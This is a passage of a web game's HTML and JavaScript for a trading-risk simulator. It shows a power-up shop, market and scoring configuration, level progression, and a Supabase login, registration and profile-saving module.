                <span id="shopCoins">0</span> 
            </div>
        </div>
        
        <div class="modal-scrollable" style="text-align: left;">
            <h3 style="color: #00d4ff; margin-bottom: 15px;">Asset Classes</h3>
            
            <div class="shop-item" id="sharesShop">
                <div style="display: flex; justify-content: space-between; align-items: center; padding: 12px; background: rgba(255,255,255,0.08); border-radius: 8px; margin-bottom: 10px; border: 1px solid rgba(255,255,255,0.1);">
                    <div>
                        <div style="font-weight: bold; color: #ffffff;"> Shares Markets</div>
                        <div style="font-size: 12px; color: #ccc;">7 tech stock markets</div>
                        <div style="font-size: 11px; color: #888;">Requires Level 3</div>
                    </div>
                    <button class="shop-btn" id="buyShares" onclick="buyShopItem('shares')" style="background: #ffd700; color: #000; border: none; padding: 8px 12px; border-radius: 6px; font-weight: bold; cursor: pointer;">150 </button>
                </div>
            </div>
            
            <div class="shop-item" id="cryptoShop">
                <div style="display: flex; justify-content: space-between; align-items: center; padding: 12px; background: rgba(255,255,255,0.08); border-radius: 8px; margin-bottom: 15px; border: 1px solid rgba(255,255,255,0.1);">
                    <div>
                        <div style="font-weight: bold; color: #ffffff;"> Crypto Markets</div>
                        <div style="font-size: 12px; color: #ccc;">7 cryptocurrency markets</div>
                        <div style="font-size: 11px; color: #888;">Requires Level 5</div>
                    </div>
                    <button class="shop-btn" id="buyCrypto" onclick="buyShopItem('crypto')" style="background: #ffd700; color: #000; border: none; padding: 8px 12px; border-radius: 6px; font-weight: bold; cursor: pointer;">300 </button>
                </div>
            </div>
            
            <h3 style="color: #00d4ff; margin-bottom: 15px;">Power-Ups</h3>
            
            <div class="shop-item">
                <div style="display: flex; justify-content: space-between; align-items: center; padding: 12px; background: rgba(255,255,255,0.08); border-radius: 8px; margin-bottom: 10px; border: 1px solid rgba(255,255,255,0.1);">
                    <div>
                        <div style="font-weight: bold; color: #ffffff;"> Market Freeze</div>
                        <div style="font-size: 12px; color: #ccc;">Stop all market movements for 10 seconds</div>
                        <div style="font-size: 11px; color: #888;">Owned: <span id="marketFreezeShopCount">0</span></div>
                    </div>
                    <button class="shop-btn" onclick="buyShopItem('marketFreeze')" style="background: #ffd700; color: #000; border: none; padding: 8px 12px; border-radius: 6px; font-weight: bold; cursor: pointer;">75 </button>
                </div>
            </div>
            
            <div class="shop-item">
                <div style="display: flex; justify-content: space-between; align-items: center; padding: 12px; background: rgba(255,255,255,0.08); border-radius: 8px; margin-bottom: 10px; border: 1px solid rgba(255,255,255,0.1);">
                    <div>
                        <div style="font-weight: bold; color: #ffffff;"> Volatility Shield</div>
                        <div style="font-size: 12px; color: #ccc;">Reduce volatility by 70% for 15 seconds</div>
                        <div style="font-size: 11px; color: #888;">Owned: <span id="volatilityShieldShopCount">0</span></div>
                    </div>
                    <button class="shop-btn" onclick="buyShopItem('volatilityShield')" style="background: #ffd700; color: #000; border: none; padding: 8px 12px; border-radius: 6px; font-weight: bold; cursor: pointer;">60 </button>
                </div>
            </div>
            
            <div class="shop-item">
                <div style="display: flex; justify-content: space-between; align-items: center; padding: 12px; background: rgba(255,255,255,0.08); border-radius: 8px; margin-bottom: 10px; border: 1px solid rgba(255,255,255,0.1);">
                    <div>
                        <div style="font-weight: bold; color: #ffffff;"> Freeze Timer</div>
                        <div style="font-size: 12px; color: #ccc;">Stop breach countdown for 5 seconds</div>
                        <div style="font-size: 11px; color: #888;">Owned: <span id="freezeTimerShopCount">0</span></div>
                    </div>
                    <button class="shop-btn" onclick="buyShopItem('freezeTimer')" style="background: #ffd700; color: #000; border: none; padding: 8px 12px; border-radius: 6px; font-weight: bold; cursor: pointer;">25 </button>
                </div>
            </div>
            
            <div class="shop-item">
                <div style="display: flex; justify-content: space-between; align-items: center; padding: 12px; background: rgba(255,255,255,0.08); border-radius: 8px; margin-bottom: 10px; border: 1px solid rgba(255,255,255,0.1);">
                    <div>
                        <div style="font-weight: bold; color: #ffffff;"> Reduce All</div>
                        <div style="font-size: 12px; color: #ccc;">Cut all exposures by 25%</div>
                        <div style="font-size: 11px; color: #888;">Owned: <span id="reduceExposuresShopCount">0</span></div>
                    </div>
                    <button class="shop-btn" onclick="buyShopItem('reduceExposures')" style="background: #ffd700; color: #000; border: none; padding: 8px 12px; border-radius: 6px; font-weight: bold; cursor: pointer;">50 </button>
                </div>
            </div>
            
            <div class="shop-item">
                <div style="display: flex; justify-content: space-between; align-items: center; padding: 12px; background: rgba(255,255,255,0.08); border-radius: 8px; margin-bottom: 10px; border: 1px solid rgba(255,255,255,0.1);">
                    <div>
                        <div style="font-weight: bold; color: #ffffff;"> Trading Places</div>
                        <div style="font-size: 12px; color: #ccc;">Freeze commodity markets for 60 seconds</div>
                        <div style="font-size: 11px; color: #888;">Owned: <span id="tradingPlacesShopCount">0</span></div>
                    </div>
                    <button class="shop-btn" onclick="buyShopItem('tradingPlaces')" style="background: #ffd700; color: #000; border: none; padding: 8px 12px; border-radius: 6px; font-weight: bold; cursor: pointer;">100 </button>
                </div>
            </div>
            
            <div class="shop-item">
                <div style="display: flex; justify-content: space-between; align-items: center; padding: 12px; background: rgba(255,255,255,0.08); border-radius: 8px; margin-bottom: 10px; border: 1px solid rgba(255,255,255,0.1);">
                    <div>
                        <div style="font-weight: bold; color: #ffffff;"> Hot Vols</div>
                        <div style="font-size: 12px; color: #ccc;">Double global volatility for 30 seconds</div>
                        <div style="font-size: 11px; color: #888;">Owned: <span id="hotVolsShopCount">0</span></div>
                    </div>
                    <button class="shop-btn" onclick="buyShopItem('hotVols')" style="background: #ffd700; color: #000; border: none; padding: 8px 12px; border-radius: 6px; font-weight: bold; cursor: pointer;">80 </button>
                </div>
            </div>
            
            <div class="shop-item">
                <div style="display: flex; justify-content: space-between; align-items: center; padding: 12px; background: rgba(255,255,255,0.08); border-radius: 8px; margin-bottom: 10px; border: 1px solid rgba(255,255,255,0.1);">
                    <div>
                        <div style="font-weight: bold; color: #ffffff;"> Nodding Bird</div>
                        <div style="font-size: 12px; color: #ccc;">Auto-hedge breaches for 30 seconds</div>
                        <div style="font-size: 11px; color: #888;">Owned: <span id="noddingBirdShopCount">0</span></div>
                    </div>
                    <button class="shop-btn" onclick="buyShopItem('noddingBird')" style="background: #ffd700; color: #000; border: none; padding: 8px 12px; border-radius: 6px; font-weight: bold; cursor: pointer;">120 </button>
                </div>
            </div>
        </div>
        
        <div class="modal-buttons">
            <button class="modal-btn" onclick="closeShop()">Close</button>
        </div>
    </div>
</div>
</div>
</div>
</div>


<script>
// ===== COMBINED GAME MODULES =====
// Generated by build script
// Module loading order: config_module -> auth_module -> gamestate_module -> markets_module -> trading_module -> powerups_module -> ui_module -> stats_module

// ===== CONFIG_MODULE MODULE =====
// ===== CORE CONFIGURATION & DATA MODULE =====
// Dependencies: None (this is the base module)
// Exposes: marketData, adminSettings, gameEndSettings, userProfile management

// Market data definitions
const marketData = window.marketData || {
    indices: [
        { name: 'S&P500', limit: 2100, exposure: 0, trend: 0, trendStrength: 1 },
        { name: 'FTSE', limit: 1998, exposure: 0, trend: 0, trendStrength: 1 },
        { name: 'DAX30', limit: 600, exposure: 0, trend: 0, trendStrength: 1 },
        { name: 'NIKKEI', limit: 1425, exposure: 0, trend: 0, trendStrength: 1 },
        { name: 'NASDAQ', limit: 1900, exposure: 0, trend: 0, trendStrength: 1 },
        { name: 'HANG SENG', limit: 975, exposure: 0, trend: 0, trendStrength: 1 },
        { name: 'CAC40', limit: 470, exposure: 0, trend: 0, trendStrength: 1 }
    ],
    forex: [
       { name: 'EURUSD', limit: 1563, exposure: 0, trend: 0, trendStrength: 1.2 },
       { name: 'GBPUSD', limit: 1225, exposure: 0, trend: 0, trendStrength: 1.2 },
       { name: 'USDJPY', limit: 1375, exposure: 0, trend: 0, trendStrength: 1.1 },
       { name: 'AUDUSD', limit: 1063, exposure: 0, trend: 0, trendStrength: 1.3 },
       { name: 'USDCAD', limit: 1188, exposure: 0, trend: 0, trendStrength: 1.1 },
       { name: 'EURGBP', limit: 938, exposure: 0, trend: 0, trendStrength: 1.0 },
       { name: 'NZDUSD', limit: 813, exposure: 0, trend: 0, trendStrength: 1.4 }
    ],
    shares: [
        { name: 'AAPL', limit: 925, exposure: 0, trend: 0, trendStrength: 1.5 },
        { name: 'MSFT', limit: 840, exposure: 0, trend: 0, trendStrength: 1.3 },
        { name: 'GOOGL', limit: 710, exposure: 0, trend: 0, trendStrength: 1.4 },
        { name: 'TSLA', limit: 1100, exposure: 0, trend: 0, trendStrength: 2.0 },
        { name: 'AMZN', limit: 780, exposure: 0, trend: 0, trendStrength: 1.4 },
        { name: 'NVDA', limit: 1250, exposure: 0, trend: 0, trendStrength: 1.8 },
        { name: 'META', limit: 960, exposure: 0, trend: 0, trendStrength: 1.6 }
    ],
    commodities: [
        { name: 'GOLD', limit: 1075, exposure: 0, trend: 0, trendStrength: 0.8 },
        { name: 'SILVER', limit: 1400, exposure: 0, trend: 0, trendStrength: 1.2 },
        { name: 'OIL WTI', limit: 4250, exposure: 0, trend: 0, trendStrength: 1.5 },
        { name: 'NAT GAS', limit: 6000, exposure: 0, trend: 0, trendStrength: 2.2 },
        { name: 'COPPER', limit: 2100, exposure: 0, trend: 0, trendStrength: 1.1 },
        { name: 'WHEAT', limit: 3400, exposure: 0, trend: 0, trendStrength: 1.4 },
        { name: 'COFFEE', limit: 4750, exposure: 0, trend: 0, trendStrength: 1.6 }
    ],
    crypto: [
        { name: 'BITCOIN', limit: 3400, exposure: 0, trend: 0, trendStrength: 2.5 },
        { name: 'ETHEREUM', limit: 2100, exposure: 0, trend: 0, trendStrength: 2.3 },
        { name: 'BNB', limit: 2900, exposure: 0, trend: 0, trendStrength: 2.1 },
        { name: 'SOLANA', limit: 4250, exposure: 0, trend: 0, trendStrength: 2.8 },
        { name: 'XRP', limit: 7500, exposure: 0, trend: 0, trendStrength: 2.4 },
        { name: 'CARDANO', limit: 9250, exposure: 0, trend: 0, trendStrength: 2.2 },
        { name: 'DOGECOIN', limit: 12500, exposure: 0, trend: 0, trendStrength: 3.0 }
    ]
};

// Admin settings - scoring, timers, and rewards
window.adminSettings = window.adminSettings || {
    breachHedgePoints: 25,     
    breachClearBonus: 50,      
    goodTradeBonus: 15,        
    badTradePenalty: -50,      
    worseBreachPenalty: -75,   
    causeBreachPenalty: -100,   
    timeoutPenalty: -150,      
    globalVolatilityMultiplier: 1.0,  
    breachTimerSeconds: 7,    
    assetVolatilityMultipliers: {
        indices: 1.0,
        forex: 0.6,
        shares: 1.4,
        commodities: 1.2,
        crypto: 2.0
    },
    coinRewards: {
        goodTrade: 0.5,
        breachHedge: 1,
        breachClear: 3,
        endGameMultiplier: 20,
        perfectGameBonus: 50,
        levelUpBonus: 25
    }
};

let adminSettings = window.adminSettings;

// Game end conditions
window.gameEndSettings = window.gameEndSettings || {
    enableTimeLimit: false,
    timeLimitMinutes: 5,
    enableMissedTimerLimit: true,
    maxMissedTimers: 3,
    enableEscalatingDifficulty: true,
    escalationInterval: 60,
    escalationAmount: 0.5
};

let gameEndSettings = window.gameEndSettings;

// Power-up states
window.activePowerups = window.activePowerups || {
    marketFreeze: { active: false, timeLeft: 0, cooldown: 0 },
    volatilityShield: { active: false, timeLeft: 0, cooldown: 0 },
    freezeTimer: { active: false, timeLeft: 0, cooldown: 0 },
    reduceExposures: { active: false, timeLeft: 0, cooldown: 0 },
    tradingPlaces: { active: false, timeLeft: 0, cooldown: 0 },
    hotVols: { active: false, timeLeft: 0, cooldown: 0 },
    noddingBird: { active: false, timeLeft: 0, cooldown: 0 }
};

let activePowerups = window.activePowerups;

// Global game constants
const baseGlobalVolatility = 1.0;

// User profile management
let userProfile = window.userProfile || {};

function initializeDefaultProfile() {
    return {
        username: 'Guest Trader',
        title: 'Novice',
        level: 1,
        currentXP: 0,
        totalXP: 0,
        gamesPlayed: 0,
        bestScore: 0,
        totalTrades: 0,
        breachesFixed: 0,
        wins: 0,
        coins: 0,
        unlockedAssets: ['indices', 'forex', 'commodities'],
        powerUps: {
            freezeTimer: 0,
            reduceExposures: 0,
            marketFreeze: 0,
            volatilityShield: 0,
            tradingPlaces: 0,
            hotVols: 0,
            noddingBird: 0
        }
    };
}

// Initialize userProfile with default values
userProfile = initializeDefaultProfile();

// Level progression system
function generateLevelRequirement(level) {
    if (level <= 20) {
        const baseRequirements = [
            300, 600, 1050, 1650, 2400, 3300, 4350, 5550, 6900, 8400,
            10050, 11850, 13800, 15900, 18150, 20550, 23100, 25800, 28650, 31650
        ];
        return baseRequirements[level - 1];
    } else {
        // Continue pattern: each level after 20 requires 3000 more XP than the previous
        return 31650 + (level - 20) * 3000;
    }
}

function getCareerTitle(level) {
    const titles = [
        'Intern I', 'Intern II', 'Intern III',
        'Junior Trader I', 'Junior Trader II', 'Junior Trader III',
        'Trader I', 'Trader II', 'Trader III',
        'Senior Trader I', 'Senior Trader II', 'Senior Trader III',
        'Lead Trader I', 'Lead Trader II', 'Lead Trader III',
        'Principal Trader', 'VP Trading', 'Managing Director',
        'Head of Trading', 'Market Master'
    ];
    
    // After level 20, keep using "Market Master" title
    if (level > 20) {
        return 'Market Master';
    }
    
    return titles[level - 1] || 'Unknown';
}

// Export to global scope to prevent redeclaration conflicts
window.marketData = marketData;
window.adminSettings = adminSettings;
window.gameEndSettings = gameEndSettings;
window.activePowerups = activePowerups;
window.userProfile = userProfile;
window.baseGlobalVolatility = baseGlobalVolatility;
window.initializeDefaultProfile = initializeDefaultProfile;
window.generateLevelRequirement = generateLevelRequirement;
window.getCareerTitle = getCareerTitle;

// ===== AUTH_MODULE MODULE =====
// ===== AUTHENTICATION SYSTEM MODULE =====
// Dependencies: config.js (userProfile, initializeDefaultProfile)
// Exposes: Authentication functions, user session management

// Supabase configuration - REPLACE WITH YOUR ACTUAL VALUES
const SUPABASE_URL = 'https://tgtzzkelnknzhkxxbvtl.supabase.co';
const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRndHp6a2VsbmtuemhreHhidnRsIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTY3NTY5MDIsImV4cCI6MjA3MjMzMjkwMn0.J3-Ht9cuqX60p0n8bSErwuR0C0NSNI-JjyyR_1SCpvg';

// Admin user configuration
const ADMIN_USERS = [
    '17dde75c-e9da-48b2-9692-2f570e3f71df', // Replace with your actual Supabase user ID
    // Add more admin user IDs as needed
];

function isAdminUser() {
    return currentUser && ADMIN_USERS.includes(currentUser.id);
}

// Global auth state
let supabase = window.supabase || null;
let currentUser = window.currentUser || null;
let isGuestMode = window.isGuestMode || false;

// Auth operation state management
let authOperationInProgress = false;

function setAuthOperationState(inProgress) {
    authOperationInProgress = inProgress;
}

function isAuthOperationInProgress() {
    return authOperationInProgress;
}

// Initialize Supabase when the page loads
function initializeSupabase() {
    try {
        if (SUPABASE_URL === 'YOUR_SUPABASE_URL_HERE' || SUPABASE_ANON_KEY === 'YOUR_SUPABASE_ANON_KEY_HERE') {
            console.log('Supabase credentials not configured, starting in guest mode');
            continueAsGuest();
            initializeEverything(); // This function needs to be defined in the main file
            return;
        }
        
        if (!window.supabase) {
            console.error('Supabase library not loaded');
            continueAsGuest();
            initializeEverything();
            return;
        }
        
        supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
        console.log('Supabase initialized successfully');
        checkAuthState();
    } catch (error) {
        console.error('Failed to initialize Supabase:', error);
        continueAsGuest();
        initializeEverything(); // This function needs to be defined in the main file
    }
}

// Check if user is already logged in
async function checkAuthState() {
    if (!supabase || isAuthOperationInProgress()) {
        continueAsGuest();
        initializeEverything(); // This function needs to be defined in the main file
        return;
    }
    
    setAuthOperationState(true);
    
    try {
        const { data: { session }, error } = await supabase.auth.getSession();
        
        if (error) {
            console.error('Auth session error:', error);
            showAuthScreen(); // This function needs to be defined in UI module
            return;
        }
        
        if (session?.user) {
            currentUser = session.user;
            await loadUserProfile();
            showMenu(); // This function needs to be defined in UI module
        } else {
            showAuthScreen(); // This function needs to be defined in UI module
        }
    } catch (error) {
        console.error('Auth check failed:', error);
        showAuthScreen(); // This function needs to be defined in UI module
    } finally {
        setAuthOperationState(false);
    }
}

// Authentication functions
async function handleLogin(event) {
    event.preventDefault();
    
    if (isAuthOperationInProgress()) {
        return; // Prevent multiple simultaneous operations
    }
    
    const email = document.getElementById('loginEmail').value;
    const password = document.getElementById('loginPassword').value;
    const button = document.getElementById('loginButton');
    const errorDiv = document.getElementById('loginError');
    
    if (!email || !password) {
        errorDiv.textContent = 'Please fill in all fields';
        errorDiv.style.display = 'block';
        return;
    }
    
    setAuthOperationState(true);
    button.disabled = true;
    button.innerHTML = '<span class="loading-spinner"></span>Signing in...';
    errorDiv.style.display = 'none';
    
    try {
        const { data, error } = await supabase.auth.signInWithPassword({
            email: email,
            password: password
        });
        
        if (error) throw error;
        
        currentUser = data.user;
        await loadUserProfile();
        showMenu(); // This function needs to be defined in UI module
        
    } catch (error) {
        console.error('Login error:', error);
        errorDiv.textContent = error.message || 'Login failed. Please try again.';
        errorDiv.style.display = 'block';
    } finally {
        setAuthOperationState(false);
        button.disabled = false;
        button.textContent = 'Sign In';
    }
}

async function handleRegister(event) {
    event.preventDefault();
    
    if (isAuthOperationInProgress()) {
        return; // Prevent multiple simultaneous operations
    }
    
    const email = document.getElementById('registerEmail').value;
    const username = document.getElementById('registerUsername').value;
    const password = document.getElementById('registerPassword').value;
    const confirmPassword = document.getElementById('confirmPassword').value;
    const button = document.getElementById('registerButton');
    const errorDiv = document.getElementById('registerError');
    const successDiv = document.getElementById('registerSuccess');
    
    errorDiv.style.display = 'none';
    successDiv.style.display = 'none';
    
    // Validation
    if (!email || !username || !password || !confirmPassword) {
        errorDiv.textContent = 'Please fill in all fields';
        errorDiv.style.display = 'block';
        return;
    }
    
    if (password !== confirmPassword) {
        errorDiv.textContent = 'Passwords do not match';
        errorDiv.style.display = 'block';
        return;
    }
    
    if (password.length < 6) {
        errorDiv.textContent = 'Password must be at least 6 characters';
        errorDiv.style.display = 'block';
        return;
    }
    
    if (!/^[a-zA-Z0-9_-]+$/.test(username)) {
        errorDiv.textContent = 'Username can only contain letters, numbers, underscores, and hyphens';
        errorDiv.style.display = 'block';
        return;
    }
    
    setAuthOperationState(true);
    button.disabled = true;
    button.innerHTML = '<span class="loading-spinner"></span>Creating account...';
    
    try {
        // First, sign up the user
        const { data, error } = await supabase.auth.signUp({
            email: email,
            password: password,
            options: {
                data: {
                    username: username
                }
            }
        });
        
        if (error) throw error;
        
        if (data.user && !data.session) {
            // Email confirmation required
            successDiv.textContent = 'Check your email for a confirmation link!';
            successDiv.style.display = 'block';
        } else if (data.session) {
            // User signed up and logged in immediately
            currentUser = data.user;
            
            // Check if username is already taken in profiles table
            const { data: existingProfile, error: profileCheckError } = await supabase
                .from('user_profiles')
                .select('username')
                .eq('username', username)
                .single();
            
            if (profileCheckError && profileCheckError.code !== 'PGRST116') {
                // Unexpected error (not "no rows found")
                console.error('Profile check error:', profileCheckError);
            }
            
            if (existingProfile) {
                // Username taken, need to sign out and show error
                await supabase.auth.signOut();
                throw new Error('Username already taken');
            }
            
            await createUserProfile(username);
            showMenu(); // This function needs to be defined in UI module
        }
        
    } catch (error) {
        console.error('Registration error:', error);
        errorDiv.textContent = error.message || 'Registration failed. Please try again.';
        errorDiv.style.display = 'block';
    } finally {
        setAuthOperationState(false);
        button.disabled = false;
        button.textContent = 'Create Account';
    }
}

async function handleLogout() {
    try {
        await saveUserProgress();
        await supabase.auth.signOut();
        currentUser = null;
        isGuestMode = false;
        userProfile = initializeDefaultProfile(); // Direct reset only on logout
        showAuthScreen(); // This function needs to be defined in UI module
    } catch (error) {
        console.error('Logout failed:', error);
        // Force logout even if save failed
        currentUser = null;
        isGuestMode = false;
        userProfile = initializeDefaultProfile();
        showAuthScreen();
    }
}

async function createUserProfile(username) {
    if (!currentUser) {
        console.error('No current user for profile creation');
        return;
    }
    
    // Check if there's saved guest progress
    const savedGuestProgress = sessionStorage.getItem('guestProgress');
    let defaultProfile;
    
    if (savedGuestProgress) {
        try {
            // Use guest progress as starting point
            const guestData = JSON.parse(savedGuestProgress);
            defaultProfile = {
                user_id: currentUser.id,
                username: username,
                level: guestData.level || 1,
                current_xp: guestData.currentXP || 0,
                total_xp: guestData.totalXP || 0,
                coins: Math.floor(guestData.coins || 0),
                games_played: guestData.gamesPlayed || 0,
                best_score: guestData.bestScore || 0,
                total_trades: guestData.totalTrades || 0,
                breaches_fixed: guestData.breachesFixed || 0,
                wins: guestData.wins || 0,
                unlocked_assets: guestData.unlockedAssets || ['indices', 'forex', 'commodities'],
                powerups: guestData.powerUps || {
                    freezeTimer: 0,
                    reduceExposures: 0,
                    marketFreeze: 0,
                    volatilityShield: 0,
                    tradingPlaces: 0,
                    hotVols: 0,
                    noddingBird: 0
                }
            };
            // Clear the temporary storage
            sessionStorage.removeItem('guestProgress');
        } catch (parseError) {
            console.error('Error parsing guest progress:', parseError);
            sessionStorage.removeItem('guestProgress');
            defaultProfile = createDefaultProfileObject(username);
        }
    } else {
        // Use default fresh profile
        defaultProfile = createDefaultProfileObject(username);
    }
    
    try {
        const { error } = await supabase
            .from('user_profiles')
            .insert([defaultProfile]);
        
        if (error) throw error;
        
        // Update local userProfile
        Object.assign(userProfile, {
            username: defaultProfile.username,
            level: defaultProfile.level,
            currentXP: defaultProfile.current_xp,
            totalXP: defaultProfile.total_xp,
            coins: defaultProfile.coins,
            gamesPlayed: defaultProfile.games_played,
            bestScore: defaultProfile.best_score,
            totalTrades: defaultProfile.total_trades,
            breachesFixed: defaultProfile.breaches_fixed,
            wins: defaultProfile.wins,
            unlockedAssets: defaultProfile.unlocked_assets,
            powerUps: defaultProfile.powerups
        });

        // Process any level-ups based on transferred XP
        if (userProfile.totalXP > 0) {
            while (userProfile.currentXP >= generateLevelRequirement(userProfile.level)) {
                userProfile.currentXP -= generateLevelRequirement(userProfile.level);
                userProfile.level++;
                showLevelUp(); // Show level up notification
                awardCoins(adminSettings.coinRewards.levelUpBonus); // Award level up coins
            }
        }

        updateMenuDisplay(); // This function needs to be defined in UI module
        updateProfileDisplay(); // This function needs to be defined in UI module
        
    } catch (error) {
        console.error('Failed to create user profile:', error);
        throw error; // Re-throw to handle in calling function
    }
}

function createDefaultProfileObject(username) {
    return {
        user_id: currentUser.id,
        username: username,
        level: 1,
        current_xp: 0,
        total_xp: 0,
        coins: 0,
        games_played: 0,
        best_score: 0,
        total_trades: 0,
        breaches_fixed: 0,
        wins: 0,
        unlocked_assets: ['indices', 'forex', 'commodities'],
        powerups: {
            freezeTimer: 0,
            reduceExposures: 0,
            marketFreeze: 0,
            volatilityShield: 0,
            tradingPlaces: 0,
            hotVols: 0,
            noddingBird: 0
        }
    };
}

async function loadUserProfile() {
    if (!currentUser) {
        console.error('No current user for profile loading');
        return;
    }
    
    try {
        const { data, error } = await supabase
            .from('user_profiles')
            .select('*')  // This should get all fields including best_score
            .eq('user_id', currentUser.id)
            .single();
        
        if (error) {
            if (error.code === 'PGRST116') {
                // No profile found, create one
                const username = currentUser.user_metadata?.username || currentUser.email.split('@')[0];
                await createUserProfile(username);
            } else {
                throw error;
            }
        } else if (data) {
            // Update local userProfile with database data
            Object.assign(userProfile, {
                username: data.username,
                level: data.level,
                currentXP: data.current_xp,
                totalXP: data.total_xp,
                coins: data.coins,
                gamesPlayed: data.games_played,
                bestScore: data.best_score || 0,  // Make sure this line exists
                totalTrades: data.total_trades,
                breachesFixed: data.breaches_fixed,
                wins: data.wins,
                unlockedAssets: data.unlocked_assets || ['indices', 'forex', 'commodities'],
                powerUps: data.powerups || {
                    freezeTimer: 0,
                    reduceExposures: 0,
                    marketFreeze: 0,
                    volatilityShield: 0,
                    tradingPlaces: 0,
                    hotVols: 0,
                    noddingBird: 0
                }
            });
            console.log("Loaded profile with best score:", userProfile.bestScore);
            updateMenuDisplay(); // This function needs to be defined in UI module
            updateProfileDisplay(); // This function needs to be defined in UI module
        }
    } catch (error) {
        console.error('Failed to load user profile:', error);
        continueAsGuest();
    }
}

async function saveUserProgress() {
    if (!currentUser || isGuestMode || !supabase) {
        return;
    }
    
    try {
        const { error } = await supabase
            .from('user_profiles')
            .update({
                username: userProfile.username,
                level: userProfile.level,
                current_xp: userProfile.currentXP,
                total_xp: userProfile.totalXP,
                coins: Math.floor(userProfile.coins),
                games_played: userProfile.gamesPlayed,
                best_score: userProfile.bestScore,  // Make sure this is included
                total_trades: userProfile.totalTrades,
                breaches_fixed: userProfile.breachesFixed,
                wins: userProfile.wins,
                unlocked_assets: userProfile.unlockedAssets,
                powerups: userProfile.powerUps,
                updated_at: new Date().toISOString()
            })
            .eq('user_id', currentUser.id);
        
        if (error) throw error;
        
    } catch (error) {
        console.error('Failed to save progress:', error);
    }
}

async function saveGameSession(sessionData) {
    if (!currentUser || isGuestMode || !supabase) {
        return;
    }
    
    try {
        console.log("Saving game session with score:", sessionData.score);
        
        // Save the game session
        const { error: sessionError } = await supabase
            .from('game_sessions')
            .insert([{
                user_id: currentUser.id,
                score: sessionData.score,
                duration: sessionData.duration,
                trades: sessionData.trades,
                breaches: sessionData.breaches,
                difficulty: sessionData.difficulty,
                created_at: new Date().toISOString()
            }]);
        
        if (sessionError) {
            console.error('Session save error:', sessionError);
            throw sessionError;
        }
        
        console.log("Game session saved successfully");
        
        // Get the current best_score from database to ensure we have the latest
        const { data: profileData, error: fetchError } = await supabase
            .from('user_profiles')
            .select('best_score')
            .eq('user_id', currentUser.id)
            .single();
        
        if (fetchError) {
            console.error('Failed to fetch current best score:', fetchError);
            return;
        }
        
        const currentBestScore = profileData.best_score || 0;
        console.log("Current DB best score:", currentBestScore, "New score:", sessionData.score);
        
        // Update best_score if this is a new high score
        if (sessionData.score > currentBestScore) {
            console.log("Updating best score to", sessionData.score, "from", currentBestScore);
            
            const { error: profileError } = await supabase
                .from('user_profiles')
                .update({
                    best_score: sessionData.score
                })
                .eq('user_id', currentUser.id);
            
            if (profileError) {
                console.error('Failed to update best score:', profileError);
            } else {
                // Update local profile as well
                userProfile.bestScore = sessionData.score;
                console.log('Best score updated successfully in database');
                
                // Force update displays
                updateMenuDisplay(); // This function needs to be defined in UI module
                updateProfileDisplay(); // This function needs to be defined in UI module
            }
        }
        
    } catch (error) {
        console.error('Failed to save game session:', error);
    }
}

// Guest mode and utility functions
function continueAsGuest() {
    // Don't start guest mode if we're in the middle of loading a user profile
    if (currentUser) {
        return;
    }
    
    isGuestMode = true;
    currentUser = null;
    resetToDefaults(); // This function needs to be defined in main file
    showMenu(); // This function needs to be defined in UI module
    initializeEverything(); // This function needs to be defined in main file
}

function guestCreateAccount() {
    // Save current progress temporarily
    const guestProgress = {
        level: userProfile.level,
        currentXP: userProfile.currentXP,
        totalXP: userProfile.totalXP,
        coins: userProfile.coins,
        gamesPlayed: userProfile.gamesPlayed,
        bestScore: userProfile.bestScore,
        totalTrades: userProfile.totalTrades,
        breachesFixed: userProfile.breachesFixed,
        wins: userProfile.wins,
        unlockedAssets: [...userProfile.unlockedAssets],
        powerUps: {...userProfile.powerUps}
    };
    
    // Store in sessionStorage temporarily
    try {
        sessionStorage.setItem('guestProgress', JSON.stringify(guestProgress));
    } catch (error) {
        console.error('Failed to save guest progress:', error);
    }
    
    // Reset guest mode and show auth screen
    isGuestMode = false;
    currentUser = null;
    showAuthScreen(); // This function needs to be defined in UI module
    showRegisterForm(); // This function needs to be defined in UI module
}

// UI helper functions for auth forms (these could be moved to UI module later)
function showLoginForm() {
    document.getElementById('loginForm').style.display = 'block';
    document.getElementById('registerForm').style.display = 'none';
    clearAuthMessages();
}

function showRegisterForm() {
    document.getElementById('loginForm').style.display = 'none';
    document.getElementById('registerForm').style.display = 'block';
    clearAuthMessages();
}

function clearAuthMessages() {
    const errorDivs = document.querySelectorAll('.auth-error, .auth-success');
    errorDivs.forEach(div => div.style.display = 'none');
}

// Auto-save progress periodically when user is playing
setInterval(() => {
    if (currentUser && !isGuestMode) {
        saveUserProgress();
    }
}, 30000); // Save every 30 seconds

// Set up auth state listener
// This should be at the end of auth.js
document.addEventListener('DOMContentLoaded', () => {
    setTimeout(() => {
        if (window.supabase && supabase && supabase.auth) {
            try {
                supabase.auth.onAuthStateChange((event, session) => {
                    if (event === 'SIGNED_OUT') {
                        currentUser = null;
                        isGuestMode = false;
                        resetToDefaults();
                        showAuthScreen();
                    } else if (event === 'SIGNED_IN' && session?.user) {
                        currentUser = session.user;
                        loadUserProfile().then(() => showMenu()).catch(error => {
                            console.error('Failed to load profile after sign in:', error);
                            continueAsGuest();
                        });
                    }
                });
            } catch (error) {
                console.error('Error setting up auth state listener:', error);
            }
        }
    }, 100);
});

// Export to global scope
window.supabase = supabase;
window.currentUser = currentUser;
window.isGuestMode = isGuestMode;
window.initializeSupabase = initializeSupabase;
window.handleLogin = handleLogin;
window.handleRegister = handleRegister;
window.handleLogout = handleLogout;
window.continueAsGuest = continueAsGuest;
window.guestCreateAccount = guestCreateAccount;
window.showLoginForm = showLoginForm;
window.showRegisterForm = showRegisterForm;
window.saveUserProgress = saveUserProgress;
window.saveGameSession = saveGameSession;
window.checkAuthState = checkAuthState;
window.createUserProfile = createUserProfile;
window.loadUserProfile = loadUserProfile;
window.clearAuthMessages = clearAuthMessages;
window.isAdminUser = isAdminUser;

// ===== GAMESTATE_MODULE MODULE =====
// ===== GAME STATE MANAGEMENT MODULE =====
// Dependencies: config.js (marketData, adminSettings, gameEndSettings, activePowerups, baseGlobalVolatility)
// Exposes: Game state variables, initialization, reset functions, game flow control

// Core game state variables
let currentAssetClass = window.currentAssetClass || 'indices';
let currentView = window.currentView || 'markets';
let markets = window.markets || [];

// Game session variables
let score = window.score || 0;
